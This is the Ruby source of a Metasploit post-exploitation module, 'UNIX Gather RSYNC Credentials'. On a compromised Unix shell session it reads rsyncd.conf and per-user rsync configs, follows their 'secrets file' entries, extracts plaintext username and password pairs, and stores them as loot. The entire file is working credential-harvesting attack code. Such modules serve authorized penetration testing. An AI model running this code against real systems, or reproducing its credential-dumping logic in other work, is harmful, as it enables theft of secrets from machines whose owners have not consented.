##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'UNIX Gather RSYNC Credentials',
        'Description'   => %q(
          Post Module to obtain credentials saved for RSYNC in various locations
        ),
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Jon Hart <jon_hart[at]rapid7.com>' ],
        'Platform'      => %w(bsd linux osx unix),
        'SessionTypes'  => %w(shell)
      )
    )

    register_options(
      [
        OptString.new('USER_CONFIG', [false, 'Attempt to passwords from this RSYNC ' \
          'configuration file relative to each local user\'s home directory.  Leave unset to disable.', 'rsyncd.conf'])
      ]
    )
    register_advanced_options(
      [
        OptString.new('RSYNCD_CONFIG', [true, 'Path to rsyncd.conf', '/etc/rsyncd.conf'])
      ]
    )
  end

  def setup
    @user_config = datastore['USER_CONFIG'].blank? ? nil : datastore['USER_CONFIG']
  end

  def dump_rsync_secrets(config_file)
    vprint_status("Attempting to get RSYNC creds from #{config_file}")
    creds_table = Rex::Ui::Text::Table.new(
      'Header' => "RSYNC credentials from #{config_file}",
      'Columns' => %w(Username Password Module)
    )

    # read the rsync configuration file, extracting the 'secrets file'
    # directive for any rsync modules (shares) within
    rsync_config = Rex::Parser::Ini.new(config_file)
    # https://github.com/rapid7/metasploit-framework/issues/6265
    rsync_config.each_key do |rmodule|
      # XXX: Ini assumes anything on either side of the = is the key and value,
      # including spaces, so we need to fix this
      module_config = Hash[rsync_config[rmodule].map { |k, v| [ k.strip, v.strip ] }]
      next unless (secrets_file = module_config['secrets file'])
      read_file(secrets_file).split(/\n/).map do |line|
        next if line =~ /^#/
        if /^(?<user>[^:]+):(?<password>.*)$/ =~ line
          creds_table << [ user, password, rmodule ]
        end
      end
    end

    return if creds_table.rows.empty?

    print_line(creds_table.to_s)
    store_loot(
      "rsync.creds",
      "text/csv",
      session,
      creds_table.to_csv,
      "rsync_credentials.txt",
      "RSYNC credentials from #{config_file}"
    )
  end

  def run
    # build up a list of rsync configuration files to read, including the
    # default location of the daemon config as well as any per-user
    # configuration files that may exist (rare)
    config_path = datastore['RSYNCD_CONFIG']
    config_files = Set.new([ config_path ])
    config_files |= enum_user_directories.map { |d| ::File.join(d, @user_config) } if @user_config
    config_files.map { |config_file| dump_rsync_secrets(config_file) }
  end
end
